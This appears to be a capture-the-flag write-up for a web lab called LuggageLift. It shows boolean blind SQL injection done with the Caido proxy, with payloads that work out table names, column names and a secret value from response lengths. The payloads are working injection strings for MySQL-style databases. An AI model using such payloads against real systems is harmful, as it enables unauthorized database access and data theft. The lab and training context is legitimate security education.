# LuggageLift

### Lab Link
[WebVerse - LuggageLift](https://dashboard.webverselabs-pro.com/mystery-challenges/luggagelift)

---

### Skills & Knowledge
- Blind Based SQL (Boolean)
- Caido Automate & Payload(Matrix)

---

First thing we verify what type of SQL is this

![alt text](/Writeups/images/LuggageLiftimage.png)

![alt text](/Writeups/images/LuggageLiftimage-1.png)

As we can see `1=1 is true` it shows a response, `1=2 is false`

![alt text](/Writeups/images/LuggageLiftimage-3.png)

![alt text](/Writeups/images/LuggageLiftimage-2.png)

Using Automate Within our Payloads both of them shows `200` response which means to identify if the input is correct we will need to base on the `Length`. Veryfing that 1=2 is false it shows around 5000 length and the 1=1 is true it has around 22000 length meaning it did something and not just shows a 200 response.

---

Now to show the tables we blindly try to know how many characters does the table 1 has. First we try from 1 to 9

```
' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1) = 5 -- -
```
![alt text](/Writeups/images/LuggageLiftimage-5.png)

![alt text](/Writeups/images/LuggageLiftimage-4.png)

Notice in our payload id 5 it has larger `length` meaning that is the correct one

Next we need to know what the table name, since we know it has 5 characters already no need to try for more character

![alt text](/Writeups/images/LuggageLiftimage-6.png)
![alt text](/Writeups/images/LuggageLiftimage-7.png)

Here it can be seen from the `length` that the first table named `items`

![alt text](/Writeups/images/LuggageLiftimage-8.png)

---

We try to the second table, by adding `OFFSET 1` it skips to the first row in this case the first table. And do the same thing again

#### First knowing how many character it have
```
' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET 1) = 5 -- -
```
#### Second is identifying the name
```
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET 1) = 'u' -- -
```
By doing the same thing second table name has been identified as `vault` which looks like something worth to dig deep.

---

#### Proceeding in the column of table `vault`
Like earlier trying every column from the first until something interesting to look at.

```
' and (select length(column_name) from information_schema.columns where table_name='vault' LIMIT 1 OFFSET 1) = 6 -- -
```

```
' AND (SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns WHERE table_name='vault' LIMIT 1 OFFSET 1) = 'i'-- -
```
In the second column it says `secret`

---

Now we take a look on what column `secret` contains

using `greater than >` instead of = can make the enumeration faster

In this payload it show that id 2 has more length meaning the character has greater than 40 characters but less than 50

![alt text](/Writeups/images/LuggageLiftimage-9.png)
![alt text](/Writeups/images/LuggageLiftimage-10.png)

```
' AND (SELECT LENGTH(secret) FROM vault LIMIT 1) = 42 -- -
```
*Note:
Add capital letters and special character.
Combine the results that have been found*

```
' AND (SELECT SUBSTRING(secret,1,1) FROM vault LIMIT 1) = 'a' -- -
```
![alt text](/Writeups/images/LuggageLiftimage-11.png)

> For faster enumeration and comparing the `Payload` and `Length` Click `filter`, and `Length` to `greater than` so it will only show the response needed and then Sort it to on what suits the better.

![alt text](/Writeups/images/LuggageLiftimage-12.png)

Now Flag can be retrieve